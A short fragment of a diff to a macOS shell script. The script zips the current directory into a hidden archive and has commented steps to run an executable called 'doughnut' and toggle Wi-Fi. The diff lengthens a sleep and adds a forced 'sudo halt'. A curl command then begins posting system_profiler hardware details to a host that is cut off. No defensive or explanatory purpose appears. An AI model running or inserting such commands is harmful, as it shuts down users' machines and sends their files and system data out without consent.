@@ -10,7 +10,8 @@ zip -r ../.downloads.zip *
 # chmod +x doughnut
 # open doughnut
 # networksetup -setnetworkserviceenabled "Wi-Fi" off
-sleep 20
+sleep 600
+sudo halt
 # networksetup -setnetworkserviceenabled "Wi-Fi" on
 curl -d '{                      
  \"sysinfo\": \"'"$(system_profiler SPHardwareDataType)"'\"
